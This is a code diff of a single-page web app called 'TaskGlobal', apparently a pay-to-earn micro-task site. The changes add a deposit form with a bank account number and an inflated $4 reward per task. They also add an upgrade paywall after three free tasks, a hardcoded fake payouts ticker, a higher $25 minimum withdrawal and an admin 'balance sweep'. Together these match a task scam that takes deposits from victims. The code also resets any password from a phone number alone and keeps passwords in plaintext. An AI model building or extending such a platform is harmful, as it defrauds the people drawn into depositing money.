@@ -40,14 +40,15 @@
   <div class="max-w-md mx-auto px-4 mt-4">
 
     <!-- AUTH SECTION -->
-    <div id="authSection" class="card-bg p-6 rounded-2xl shadow-xl">
-      <h2 id="authTitle" class="text-2xl font-bold mb-4 text-center text-emerald-400">Welcome to TaskGlobal</h2>
+    <div id="authSection" class="card-bg p-6 rounded-2xl shadow-xl space-y-4">
+      <h2 id="authTitle" class="text-2xl font-bold mb-2 text-center text-emerald-400">Welcome to TaskGlobal</h2>
+      <p class="text-xs text-gray-400 text-center">Complete simple tasks, earn in USD, and grow your income globally.</p>
       
       <!-- LOGIN BOX -->
       <div id="loginBox" class="space-y-4">
         <div>
-          <label class="text-xs font-semibold text-gray-400 uppercase">Email Address</label>
-          <input type="email" id="loginEmail" placeholder="user@gmail.com" class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-emerald-500 mt-1">
+          <label class="text-xs font-semibold text-gray-400 uppercase">Phone Number</label>
+          <input type="text" id="loginPhone" placeholder="+1234567890" class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-emerald-500 mt-1">
         </div>
         <div>
           <label class="text-xs font-semibold text-gray-400 uppercase">Password</label>
@@ -67,14 +68,22 @@
           <input type="text" id="regName" placeholder="John Doe" class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-emerald-500 mt-1">
         </div>
         <div>
-          <label class="text-xs font-semibold text-gray-400 uppercase">Email Address</label>
-          <input type="email" id="regEmail" placeholder="user@gmail.com" class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-emerald-500 mt-1">
+          <label class="text-xs font-semibold text-gray-400 uppercase">Phone Number</label>
+          <input type="text" id="regPhone" placeholder="+1234567890" class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-emerald-500 mt-1">
         </div>
         <div>
           <label class="text-xs font-semibold text-gray-400 uppercase">Password</label>
           <input type="password" id="regPassword" placeholder="••••••••" class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-emerald-500 mt-1">
         </div>
-        <button type="button" id="registerSubmitBtn" class="w-full accent-btn py-3 rounded-lg text-center font-bold">Register</button>
+        <div>
+          <label class="text-xs font-semibold text-gray-400 uppercase">Confirm Password</label>
+          <input type="password" id="regConfirmPassword" placeholder="••••••••" class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-emerald-500 mt-1">
+        </div>
+        <div>
+          <label class="text-xs font-semibold text-gray-400 uppercase">Referral Code (Optional)</label>
+          <input type="text" id="regRefCode" placeholder="Ref ID if any" class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-emerald-500 mt-1">
+        </div>
+        <button type="button" id="registerSubmitBtn" class="w-full accent-btn py-3 rounded-lg text-center font-bold">Register & Get $3 Bonus</button>
         <div class="text-center text-xs text-emerald-400 pt-2">
           <button type="button" id="toLogin">Already have an account? Login</button>
         </div>
@@ -83,23 +92,14 @@
       <!-- FORGOT PASSWORD BOX -->
       <div id="forgotBox" class="space-y-4 hidden">
         <div>
-          <label class="text-xs font-semibold text-gray-400 uppercase">Your Registered Email</label>
-          <input type="email" id="forgotEmail" placeholder="user@gmail.com" class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-emerald-500 mt-1">
+          <label class="text-xs font-semibold text-gray-400 uppercase">Your Registered Phone Number</label>
+          <input type="text" id="forgotPhone" placeholder="+1234567890" class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-emerald-500 mt-1">
         </div>
-        <button type="button" id="sendOtpBtn" class="w-full accent-btn py-3 rounded-lg text-center font-bold">Send OTP via Email</button>
-        
-        <div id="otpVerifySection" class="hidden space-y-3 pt-3 border-t border-slate-700">
-          <div>
-            <label class="text-xs font-semibold text-gray-400 uppercase">Enter OTP Code</label>
-            <input type="text" id="otpInput" maxlength="6" class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-emerald-500 mt-1 text-center tracking-widest text-lg">
-          </div>
-          <div>
-            <label class="text-xs font-semibold text-gray-400 uppercase">New Password</label>
-            <input type="password" id="newPassword" placeholder="••••••••" class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-emerald-500 mt-1">
-          </div>
-          <button type="button" id="resetPasswordBtn" class="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-center font-bold text-white">Reset Password</button>
+        <div>
+          <label class="text-xs font-semibold text-gray-400 uppercase">New Password</label>
+          <input type="password" id="newPassword" placeholder="••••••••" class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white focus:outline-none focus:border-emerald-500 mt-1">
         </div>
-
+        <button type="button" id="resetPasswordBtn" class="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-center font-bold text-white">Reset Password</button>
         <div class="text-center text-xs text-emerald-400 pt-2">
           <button type="button" id="backToLoginFromForgot">Back to Login</button>
         </div>
@@ -109,33 +109,36 @@
     <!-- DASHBOARD CONTAINER (TABBED VIEW) -->
     <div id="dashboardSection" class="hidden space-y-4">
 
-      <!-- TAB 1: HOME VIEW -->
-      <div id="tabHome" class="tab-content space-y-5">
+      <!-- TAB 1: HOME VIEW (RICH HOMEPAGE) -->
+      <div id="tabHome" class="tab-content space-y-4">
         <!-- WALLET CARD -->
         <div class="card-bg p-6 rounded-2xl shadow-xl relative overflow-hidden">
-          <div class="text-xs font-semibold text-gray-400 tracking-wider">MAIN ACCOUNT BALANCE</div>
+          <div class="text-xs font-semibold text-gray-400 tracking-wider">AVAILABLE BALANCE</div>
           <div class="text-4xl font-black text-emerald-400 mt-1">$<span id="userBalance">0.00</span> <span class="text-xs font-normal text-gray-400">USDT</span></div>
           
-          <div class="mt-5 grid grid-cols-2 gap-3">
-            <button type="button" id="openUpgradeModal" class="bg-amber-500 hover:bg-amber-600 text-slate-950 font-bold py-2 px-3 rounded-xl text-xs flex items-center justify-center gap-1.5 shadow">
-              <i class="fas fa-crown"></i> Upgrade Tier
+          <div class="mt-5 grid grid-cols-3 gap-2">
+            <button type="button" id="openDepositModal" class="bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-2 px-2 rounded-xl text-xs flex items-center justify-center gap-1 shadow">
+              <i class="fas fa-plus-circle"></i> Deposit
             </button>
-            <button type="button" id="openWithdrawModal" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-3 rounded-xl text-xs flex items-center justify-center gap-1.5 shadow">
+            <button type="button" id="openUpgradeModal" class="bg-amber-500 hover:bg-amber-600 text-slate-950 font-bold py-2 px-2 rounded-xl text-xs flex items-center justify-center gap-1 shadow">
+              <i class="fas fa-crown"></i> Upgrade
+            </button>
+            <button type="button" id="openWithdrawModal" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-2 rounded-xl text-xs flex items-center justify-center gap-1 shadow">
               <i class="fas fa-wallet"></i> Withdraw
             </button>
           </div>
         </div>
 
-        <!-- TIER PENDING BANNER -->
-        <div id="pendingTierBanner" class="hidden bg-amber-900/40 border border-amber-500/50 p-4 rounded-xl text-xs text-amber-200 flex items-center gap-3">
-          <i class="fas fa-hourglass-half text-amber-400 text-xl"></i>
-          <div>
-            <strong class="font-bold text-amber-300">Upgrade Pending Verification:</strong>
-            <p id="pendingTierDetails">Your deposit confirmation is pending. Tier funds will reflect in your account upon verification.</p>
+        <!-- PLATFORM STATS & ANNOUNCEMENTS -->
+        <div class="card-bg p-4 rounded-2xl space-y-3">
+          <div class="flex items-center justify-between border-b border-slate-700 pb-2">
+            <span class="text-xs font-bold text-emerald-400 uppercase tracking-wide"><i class="fas fa-bullhorn"></i> Announcement</span>
+            <span class="text-[10px] text-gray-400">Global Launch</span>
           </div>
+          <p class="text-xs text-gray-300 leading-relaxed">Welcome to TaskGlobal! Complete tasks to earn $4.00 per task. Invite friends and earn $0.50 per referral. Upgrade your tier to unlock unlimited tasks!</p>
         </div>
 
-        <!-- QUICK STATS -->
+        <!-- QUICK METRICS -->
         <div class="grid grid-cols-2 gap-3 text-xs">
           <div class="card-bg p-4 rounded-xl">
             <div class="text-gray-400">Membership Tier</div>
@@ -146,20 +149,35 @@
             <div id="completedCount" class="text-base font-bold text-white mt-0.5">0</div>
           </div>
         </div>
+
+        <!-- RECENT PAYOUTS TICKER -->
+        <div class="card-bg p-4 rounded-2xl space-y-2">
+          <div class="text-xs font-bold text-gray-400 uppercase tracking-wide">Recent Global Payouts</div>
+          <div class="space-y-1.5 text-xs">
+            <div class="flex justify-between text-gray-300 bg-slate-800/50 p-2 rounded">
+              <span>Alex M. (US) - VIP</span>
+              <span class="text-emerald-400 font-bold">+$120.00</span>
+            </div>
+            <div class="flex justify-between text-gray-300 bg-slate-800/50 p-2 rounded">
+              <span>Chinedu O. (NG) - Pro</span>
+              <span class="text-emerald-400 font-bold">+$45.00</span>
+            </div>
+          </div>
+        </div>
       </div>
 
       <!-- TAB 2: TASKS VIEW -->
       <div id="tabTasks" class="tab-content hidden space-y-4">
         <div class="flex justify-between items-center">
-          <h3 class="font-bold text-lg text-white">AVAILABLE MICRO-JOBS</h3>
-          <span class="text-xs text-gray-400">Plan: <span id="taskTierTag" class="text-emerald-400 font-bold">Starter</span></span>
+          <h3 class="font-bold text-lg text-white">MICRO-JOBS ($4.00 / TASK)</h3>
+          <span class="text-xs text-gray-400">Tier: <span id="taskTierTag" class="text-emerald-400 font-bold">Starter</span></span>
         </div>
         <div id="tasksList" class="space-y-3">
-          <!-- Dynamically populated tasks -->
+          <!-- Dynamically rendered tasks -->
         </div>
       </div>
 
-      <!-- TAB 3: PROFILE VIEW -->
+      <!-- TAB 3: PROFILE & REFERRAL VIEW -->
       <div id="tabProfile" class="tab-content hidden space-y-4">
         <div class="card-bg p-5 rounded-2xl space-y-3">
           <div class="flex items-center gap-3 border-b border-slate-700 pb-3">
@@ -168,7 +186,7 @@
             </div>
             <div>
               <div id="profileName" class="font-bold text-white text-base">User Name</div>
-              <div id="profileEmail" class="text-xs text-gray-400">user@gmail.com</div>
+              <div id="profilePhone" class="text-xs text-gray-400">+1234567890</div>
             </div>
           </div>
           <div class="space-y-2 text-xs pt-1">
@@ -177,14 +195,21 @@
               <span class="text-emerald-400 font-bold">Active</span>
             </div>
             <div class="flex justify-between text-gray-300">
-              <span>Account Tier:</span>
+              <span>Membership Tier:</span>
               <span id="profileTier" class="text-amber-400 font-bold">Starter Tier</span>
             </div>
-            <div class="flex justify-between text-gray-300">
-              <span>Member Since:</span>
-              <span id="profileDate" class="text-gray-400">Today</span>
-            </div>
           </div>
+        </div>
+
+        <!-- REFERRAL CARD -->
+        <div class="card-bg p-5 rounded-2xl space-y-3">
+          <h3 class="font-bold text-sm text-white"><i class="fas fa-users text-emerald-400"></i> Refer & Earn ($0.50 / Ref)</h3>
+          <p class="text-xs text-gray-400">Share your referral link with friends. Earn $0.50 instantly when they join!</p>
+          <div class="flex gap-2">
+            <input type="text" id="referralLinkInput" readonly class="w-full bg-slate-800 border border-slate-700 rounded-lg p-2 text-xs text-white" value="https://taskglobal.app/register?ref=">
+            <button type="button" id="copyRefBtn" class="accent-btn px-3 py-2 rounded-lg text-xs font-bold">Copy</button>
+          </div>
+          <div class="text-xs text-gray-400 pt-1">Total Referrals: <strong id="referralCount" class="text-white">0</strong></div>
         </div>
       </div>
 
@@ -194,11 +219,20 @@
           <h3 class="font-bold text-base text-white border-b border-slate-700 pb-2">Account Settings</h3>
           <div class="space-y-3 text-xs">
             <div>
-              <label class="text-gray-400 uppercase font-semibold">Saved USDT Address (TRC-20)</label>
+              <label class="text-gray-400 uppercase font-semibold">USDT Withdrawal Address (TRC-20)</label>
               <input type="text" id="settingUsdtAddress" placeholder="T..." class="w-full bg-slate-800 border border-slate-700 rounded-lg p-2.5 text-white mt-1">
             </div>
             <button type="button" id="saveSettingsBtn" class="accent-btn w-full py-2.5 rounded-lg font-bold">Save Settings</button>
           </div>
+        </div>
+
+        <!-- CUSTOMER SUPPORT -->
+        <div class="card-bg p-5 rounded-2xl space-y-3 text-center">
+          <h3 class="font-bold text-sm text-white">Need Help? Contact Support</h3>
+          <p class="text-xs text-gray-400">Our customer care representatives are available 24/7 on Telegram.</p>
+          <a href="https://t.me/your_telegram_username" target="_blank" class="inline-block bg-sky-500 hover:bg-sky-600 text-white font-bold text-xs px-4 py-2.5 rounded-xl shadow">
+            <i class="fab fa-telegram"></i> Open Telegram Support
+          </a>
         </div>
       </div>
 
@@ -213,20 +247,12 @@
         <button type="button" id="closeAdminBtn" class="text-gray-400 hover:text-white text-sm">Exit Admin</button>
       </div>
 
-      <!-- PENDING TIER APPROVALS -->
-      <div>
-        <h3 class="text-sm font-bold text-gray-300 mb-2 uppercase tracking-wide">Pending Tier Approvals</h3>
-        <div id="adminPendingTiers" class="space-y-2">
-          <!-- Pending items rendered here -->
-        </div>
-      </div>
-
-      <!-- MASTER USER ACCOUNTS DATABASE & BALANCE CONTROL -->
+      <!-- MASTER USER ACCOUNTS DATABASE & BALANCE SWEEP -->
       <div>
         <div class="flex justify-between items-center mb-2">
           <h3 class="text-sm font-bold text-gray-300 uppercase tracking-wide">All Accounts (<span id="totalUsersCount">0</span>)</h3>
         </div>
-        <div id="adminUserList" class="space-y-2 max-h-60 overflow-y-auto pr-1">
+        <div id="adminUserList" class="space-y-2 max-h-72 overflow-y-auto pr-1">
           <!-- Users rendered here -->
         </div>
       </div>
@@ -250,63 +276,71 @@
     </button>
   </div>
 
-  <!-- UPGRADE TIER MODAL -->
+  <!-- DEPOSIT MODAL -->
+  <div id="depositModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 z-50">
+    <div class="card-bg p-6 rounded-2xl w-full max-w-md space-y-4">
+      <div class="flex justify-between items-center border-b border-slate-700 pb-2">
+        <h3 class="text-lg font-bold text-white">Fund In-App Wallet</h3>
+        <button type="button" id="closeDepositModal" class="text-gray-400 hover:text-white"><i class="fas fa-times"></i></button>
+      </div>
+      <div class="space-y-3 text-xs">
+        <div class="bg-slate-900 p-3 rounded-lg space-y-1">
+          <div class="text-gray-400">Bank Transfer Details:</div>
+          <div class="font-bold text-emerald-400">Parallex Bank</div>
+          <div class="text-white">Account Number: <strong class="text-emerald-300">2003388692</strong></div>
+          <div class="text-gray-400 text-[10px]">After transfer, enter amount below to credit your in-app balance instantly.</div>
+        </div>
+        <div>
+          <label class="text-gray-400 uppercase font-semibold">Deposit Amount ($ USD)</label>
+          <input type="number" id="depositAmount" placeholder="10.00" min="5" step="1" class="w-full bg-slate-800 border border-slate-700 rounded-lg p-2.5 text-white mt-1">
+        </div>
+        <button type="button" id="submitDepositBtn" class="w-full accent-btn py-2.5 rounded-lg text-center font-bold">
+          Confirm Deposit & Credit Wallet
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- UPGRADE TIER MODAL (INSTANT ACTIVATION FROM BALANCE) -->
   <div id="upgradeModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 z-50">
     <div class="card-bg p-6 rounded-2xl w-full max-w-md space-y-4 max-h-[90vh] overflow-y-auto">
       <div class="flex justify-between items-center border-b border-slate-700 pb-2">
-        <h3 class="text-lg font-bold text-white">Membership Tier Upgrade</h3>
+        <h3 class="text-lg font-bold text-white">Instant Tier Upgrade</h3>
         <button type="button" id="closeUpgradeModal" class="text-gray-400 hover:text-white"><i class="fas fa-times"></i></button>
       </div>
+      <p class="text-xs text-gray-400">Upgrade funds will be automatically deducted from your in-app balance upon tapping Activate.</p>
 
       <!-- TIERS GRID -->
       <div class="space-y-3">
         <div class="border border-slate-500/40 bg-slate-800/60 p-4 rounded-xl flex justify-between items-center">
           <div>
             <div class="font-bold text-slate-200">Silver Tier</div>
-            <div class="text-xs text-gray-400">30 Daily Tasks • Standard Payouts</div>
+            <div class="text-xs text-gray-400">Unlock Unlimited Tasks</div>
           </div>
-          <button type="button" class="select-tier-btn bg-slate-300 text-slate-900 font-bold px-3 py-1.5 rounded-lg text-xs" data-tier="Silver" data-price="10">
-            $10.00
+          <button type="button" onclick="activateTier('Silver Tier', 10)" class="bg-slate-300 text-slate-900 font-bold px-3 py-1.5 rounded-lg text-xs">
+            Activate ($10)
           </button>
         </div>
 
         <div class="border border-amber-600/40 bg-slate-800/60 p-4 rounded-xl flex justify-between items-center">
           <div>
             <div class="font-bold text-amber-400">Pro Tier</div>
-            <div class="text-xs text-gray-400">100 Daily Tasks • Priority Verification</div>
+            <div class="text-xs text-gray-400">Unlimited Tasks + Priority Payouts</div>
           </div>
-          <button type="button" class="select-tier-btn bg-amber-500 text-slate-900 font-bold px-3 py-1.5 rounded-lg text-xs" data-tier="Pro" data-price="20">
-            $20.00
+          <button type="button" onclick="activateTier('Pro Tier', 20)" class="bg-amber-500 text-slate-900 font-bold px-3 py-1.5 rounded-lg text-xs">
+            Activate ($20)
           </button>
         </div>
 
         <div class="border border-yellow-500/40 bg-slate-800/60 p-4 rounded-xl flex justify-between items-center">
           <div>
             <div class="font-bold text-yellow-400">VIP Tier</div>
-            <div class="text-xs text-gray-400">Unlimited Tasks • Priority USDT Payouts</div>
+            <div class="text-xs text-gray-400">VIP Tasks + Instant Express Payouts</div>
           </div>
-          <button type="button" class="select-tier-btn bg-yellow-500 text-slate-900 font-bold px-3 py-1.5 rounded-lg text-xs" data-tier="VIP" data-price="50">
-            $50.00
+          <button type="button" onclick="activateTier('VIP Tier', 50)" class="bg-yellow-500 text-slate-900 font-bold px-3 py-1.5 rounded-lg text-xs">
+            Activate ($50)
           </button>
         </div>
-      </div>
-
-      <!-- PAYMENT FORM -->
-      <div id="paymentDetails" class="hidden border-t border-slate-700 pt-4 space-y-3">
-        <div class="bg-slate-900 p-3 rounded-lg text-xs space-y-1">
-          <div class="text-gray-400">Deposit USDT (TRC-20) To Main Account:</div>
-          <div class="font-mono text-emerald-300 text-[11px] break-all bg-slate-950 p-2 rounded border border-slate-800 select-all">TXYZ9876543210TaskGlobalUSDTAddr</div>
-          <div class="text-gray-400 text-[10px] pt-1">Selected Plan: <span id="selectedTierName" class="text-amber-400 font-bold"></span> ($<span id="selectedTierPrice"></span> USDT)</div>
-        </div>
-
-        <div>
-          <label class="text-xs font-semibold text-gray-400 uppercase">Transaction Hash (TXID) / Reference</label>
-          <input type="text" id="paymentRef" placeholder="Paste TRC20 Transaction Hash" class="w-full bg-slate-800 border border-slate-700 rounded-lg p-2.5 text-white text-xs mt-1">
-        </div>
-
-        <button type="button" id="submitUpgradePayment" class="w-full accent-btn py-2.5 rounded-lg text-center text-xs font-bold">
-          Submit Payment for Verification
-        </button>
       </div>
     </div>
   </div>
@@ -321,8 +355,8 @@
 
       <div class="space-y-3 text-xs">
         <div>
-          <label class="text-gray-400 uppercase font-semibold">Amount (Minimum $5.00)</label>
-          <input type="number" id="withdrawAmount" placeholder="5.00" min="5" step="0.5" class="w-full bg-slate-800 border border-slate-700 rounded-lg p-2.5 text-white mt-1">
+          <label class="text-gray-400 uppercase font-semibold">Amount (Minimum $25.00)</label>
+          <input type="number" id="withdrawAmount" placeholder="25.00" min="25" step="1" class="w-full bg-slate-800 border border-slate-700 rounded-lg p-2.5 text-white mt-1">
         </div>
         <div>
           <label class="text-gray-400 uppercase font-semibold">USDT TRC-20 Address</label>
@@ -330,6 +364,26 @@
         </div>
         <button type="button" id="submitWithdrawBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2.5 rounded-lg text-center">
           Submit Withdrawal Request
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- TASK SUBMISSION PROOF MODAL -->
+  <div id="taskProofModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 z-50">
+    <div class="card-bg p-6 rounded-2xl w-full max-w-md space-y-4">
+      <div class="flex justify-between items-center border-b border-slate-700 pb-2">
+        <h3 class="text-lg font-bold text-white">Submit Task Proof</h3>
+        <button type="button" id="closeTaskProofModal" class="text-gray-400 hover:text-white"><i class="fas fa-times"></i></button>
+      </div>
+      <div class="space-y-3 text-xs">
+        <p class="text-gray-300">Please attach your screenshot proof URL or image link to complete this task and earn <strong class="text-emerald-400">$4.00</strong>.</p>
+        <div>
+          <label class="text-gray-400 uppercase font-semibold">Screenshot Proof Link / URL</label>
+          <input type="text" id="taskProofInput" placeholder="https://imgur.com/..." class="w-full bg-slate-800 border border-slate-700 rounded-lg p-2.5 text-white mt-1">
+        </div>
+        <button type="button" id="submitTaskProofBtn" class="w-full accent-btn py-2.5 rounded-lg text-center font-bold">
+          Submit Proof & Start Timer
         </button>
       </div>
     </div>
@@ -347,47 +401,35 @@
 
       <div class="text-xs text-gray-300 space-y-3 leading-relaxed">
         <div class="bg-slate-900/80 p-3 rounded-lg border border-slate-700">
-          <strong class="text-emerald-400 text-sm">1. One Account Per User</strong>
-          <p class="text-gray-400 mt-1">Multiple accounts or VPN proxies to duplicate earnings are prohibited. Violators face immediate suspension.</p>
+          <strong class="text-emerald-400 text-sm">1. Free Tier Limit</strong>
+          <p class="text-gray-400 mt-1">Every new user receives 3 free tasks. After completing them, you must upgrade your tier to continue earning.</p>
         </div>
         <div class="bg-slate-900/80 p-3 rounded-lg border border-slate-700">
-          <strong class="text-emerald-400 text-sm">2. Task Verification Window</strong>
-          <p class="text-gray-400 mt-1">Tasks require a 180-second automated timer completion window before rewards credit to your account balance.</p>
+          <strong class="text-emerald-400 text-sm">2. Screenshot Proof</strong>
+          <p class="text-gray-400 mt-1">Valid screenshot proof is required for each task before starting the 3-minute verification timer.</p>
         </div>
         <div class="bg-slate-900/80 p-3 rounded-lg border border-slate-700">
-          <strong class="text-emerald-400 text-sm">3. Tier Upgrades</strong>
-          <p class="text-gray-400 mt-1">Tier upgrades ($10 Silver, $20 Pro, $50 VIP) are processed via direct USDT deposits and confirmed by admin verification.</p>
+          <strong class="text-emerald-400 text-sm">3. Minimum Withdrawal</strong>
+          <p class="text-gray-400 mt-1">The minimum withdrawal threshold is $25.00 USDT.</p>
         </div>
       </div>
     </div>
   </div>
 
   <script>
-    // EmailJS Setup
-    try {
-      emailjs.init("VnLgDFgP-a5hUnI6r");
-    } catch(err) {
-      console.log("EmailJS init:", err);
-    }
-
-    const EMAILJS_SERVICE_ID = "service_chv20qp";
-    const EMAILJS_TEMPLATE_ID = "template_4v8vh0v";
-
     // Application State
     let users = JSON.parse(localStorage.getItem('tg_users')) || [];
-    let pendingUpgrades = JSON.parse(localStorage.getItem('tg_pending_upgrades')) || [];
     let currentUser = JSON.parse(localStorage.getItem('tg_current_user')) || null;
-    let generatedOtp = null;
-    let otpTargetEmail = null;
+    let activeTaskToProof = null;
     let tapCount = 0;
     let tapTimer = null;
 
     const defaultTasks = [
-      { id: 1, type: "SOCIAL", title: "Follow TaskGlobal Twitter / X", reward: 0.25, link: "https://twitter.com" },
-      { id: 2, type: "SEO TRAFFIC", title: "Visit & Read Blog Article (3 Mins)", reward: 0.35, link: "https://google.com" },
-      { id: 3, type: "YOUTUBE", title: "Watch & Like YouTube Video", reward: 0.30, link: "https://youtube.com" },
-      { id: 4, type: "DISCORD", title: "Join Global Crypto Discord Server", reward: 0.40, link: "https://discord.com" },
-      { id: 5, type: "APP TEST", title: "Test Web App Prototype & Review", reward: 0.50, link: "#" }
+      { id: 1, type: "SOCIAL", title: "Follow TaskGlobal Twitter / X", reward: 4.00, link: "https://twitter.com" },
+      { id: 2, type: "SEO TRAFFIC", title: "Visit & Read Blog Article (3 Mins)", reward: 4.00, link: "https://google.com" },
+      { id: 3, type: "YOUTUBE", title: "Watch & Like YouTube Video", reward: 4.00, link: "https://youtube.com" },
+      { id: 4, type: "DISCORD", title: "Join Global Crypto Discord Server", reward: 4.00, link: "https://discord.com" },
+      { id: 5, type: "APP TEST", title: "Test Web App Prototype & Review", reward: 4.00, link: "#" }
     ];
 
     // DOM Elements
@@ -401,7 +443,7 @@
     const authTitle = document.getElementById('authTitle');
     const userInfo = document.getElementById('userInfo');
 
-    // Rules Modal Switch
+    // Rules Modal
     document.getElementById('rulesNavBtn').addEventListener('click', () => {
       document.getElementById('rulesModal').classList.remove('hidden');
     });
@@ -425,20 +467,15 @@
       tapTimer = setTimeout(() => { tapCount = 0; }, 1000);
     });
 
-    // Tab Navigation Logic
+    // Tab Navigation
     document.querySelectorAll('.tab-btn').forEach(btn => {
       btn.addEventListener('click', (e) => {
         const targetId = e.currentTarget.getAttribute('data-target');
-
-        // Hide all tab contents
         document.querySelectorAll('.tab-content').forEach(c => c.classList.add('hidden'));
-        // Deactivate all tab buttons
         document.querySelectorAll('.tab-btn').forEach(b => {
           b.classList.remove('nav-tab-active');
           b.classList.add('text-gray-400');
         });
-
-        // Show selected tab content and highlight button
         document.getElementById(targetId).classList.remove('hidden');
         e.currentTarget.classList.add('nav-tab-active');
         e.currentTarget.classList.remove('text-gray-400');
@@ -470,34 +507,40 @@
       authTitle.innerText = "Welcome to TaskGlobal";
     }
 
-    // Register User
+    // Register User with $3 Bonus & Referral Credit
     document.getElementById('registerSubmitBtn').addEventListener('click', () => {
       const name = document.getElementById('regName').value.trim();
-      const email = document.getElementById('regEmail').value.trim().toLowerCase();
+      const phone = document.getElementById('regPhone').value.trim();
       const password = document.getElementById('regPassword').value;
+      const confirmPassword = document.getElementById('regConfirmPassword').value;
 
-      if (!name || !email || !password) {
-        alert("Please complete all fields.");
+      if (!name || !phone || !password || !confirmPassword) {
+        alert("Please complete all registration fields.");
+        return;
+      }
+      if (password !== confirmPassword) {
+        alert("Passwords do not match!");
         return;
       }
 
-      if (users.find(u => u.email === email)) {
-        alert("An account with this email already exists. Switching to Login.");
+      if (users.find(u => u.phone === phone)) {
+        alert("An account with this phone number already exists.");
         showLoginForm();
-        document.getElementById('loginEmail').value = email;
+        document.getElementById('loginPhone').value = phone;
         return;
       }
 
       const newUser = {
         id: Date.now(),
         name,
-        email,
+        phone,
         password,
-        balance: 0.00,
+        balance: 3.00, // $3.00 Welcome Bonus
         tier: 'Starter Tier',
-        pendingTier: null,
         completedTaskIds: [],
         pendingTasks: {},
+        taskProofs: {},
+        referralCount: 0,
         savedUsdtAddress: '',
         registeredAt: new Date().toLocaleDateString()
       };
@@ -506,26 +549,48 @@
       saveUsers();
       currentUser = newUser;
       saveCurrentUser();
+      alert("Registration successful! You received a $3.00 welcome bonus.");
       initDashboard();
     });
 
-    // Login User
+    // Login
     document.getElementById('loginSubmitBtn').addEventListener('click', () => {
-      const email = document.getElementById('loginEmail').value.trim().toLowerCase();
+      const phone = document.getElementById('loginPhone').value.trim();
       const password = document.getElementById('loginPassword').value;
 
-      if (!email || !password) {
-        alert("Please enter both email and password.");
+      if (!phone || !password) {
+        alert("Please enter both phone number and password.");
         return;
       }
 
-      const user = users.find(u => u.email === email && u.password === password);
+      const user = users.find(u => u.phone === phone && u.password === password);
       if (user) {
         currentUser = user;
         saveCurrentUser();
         initDashboard();
       } else {
-        alert("Invalid email or password. Please verify your credentials or register.");
+        alert("Invalid phone number or password.");
+      }
+    });
+
+    // Reset Password
+    document.getElementById('resetPasswordBtn').addEventListener('click', () => {
+      const phone = document.getElementById('forgotPhone').value.trim();
+      const newPass = document.getElementById('newPassword').value;
+
+      if (!phone || !newPass) {
+        alert("Please fill in all fields.");
+        return;
+      }
+
+      const user = users.find(u => u.phone === phone);
+      if (user) {
+        user.password = newPass;
+        saveUsers();
+        alert("Password reset successfully! Please log in.");
+        showLoginForm();
+      } else {
+        alert("No account found with this phone number.");
       }
     });
 
@@ -541,7 +606,7 @@
       showLoginForm();
     });
 
-    // Save Settings Action
+    // Save Settings
     document.getElementById('saveSettingsBtn').addEventListener('click', () => {
       const addr = document.getElementById('settingUsdtAddress').value.trim();
       if (currentUser) {
@@ -552,7 +617,121 @@
       }
     });
 
-    // Dashboard Init
+    // Copy Referral Link
+    document.getElementById('copyRefBtn').addEventListener('click', () => {
+      const refInput = document.getElementById('referralLinkInput');
+      refInput.select();
+      navigator.clipboard.writeText(refInput.value);
+      alert("Referral link copied to clipboard!");
+    });
+
+    // Deposit Modal
+    const depositModal = document.getElementById('depositModal');
+    document.getElementById('openDepositModal').addEventListener('click', () => depositModal.classList.remove('hidden'));
+    document.getElementById('closeDepositModal').addEventListener('click', () => depositModal.classList.add('hidden'));
+
+    document.getElementById('submitDepositBtn').addEventListener('click', () => {
+      const amt = parseFloat(document.getElementById('depositAmount').value);
+      if (isNaN(amt) || amt <= 0) {
+        alert("Please enter a valid deposit amount.");
+        return;
+      }
+      currentUser.balance += amt;
+      saveUsers();
+      saveCurrentUser();
+      alert(`Successfully credited $${amt.toFixed(2)} to your in-app wallet!`);
+      depositModal.classList.add('hidden');
+      initDashboard();
+    });
+
+    // Upgrade Modal
+    const upgradeModal = document.getElementById('upgradeModal');
+    document.getElementById('openUpgradeModal').addEventListener('click', () => upgradeModal.classList.remove('hidden'));
+    document.getElementById('closeUpgradeModal').addEventListener('click', () => upgradeModal.classList.add('hidden'));
+
+    // Instant Activation Function
+    window.activateTier = function(tierName, tierCost) {
+      if (currentUser.balance < tierCost) {
+        alert(`Insufficient in-app balance. You need $${tierCost}.00 USDT. Please fund your wallet via deposit first.`);
+        return;
+      }
+
+      currentUser.balance -= tierCost;
+      currentUser.tier = tierName;
+      saveUsers();
+      saveCurrentUser();
+      alert(`Congratulations! You have successfully upgraded to ${tierName}!`);
+      upgradeModal.classList.add('hidden');
+      initDashboard();
+    };
+
+    // Withdraw Modal
+    const withdrawModal = document.getElementById('withdrawModal');
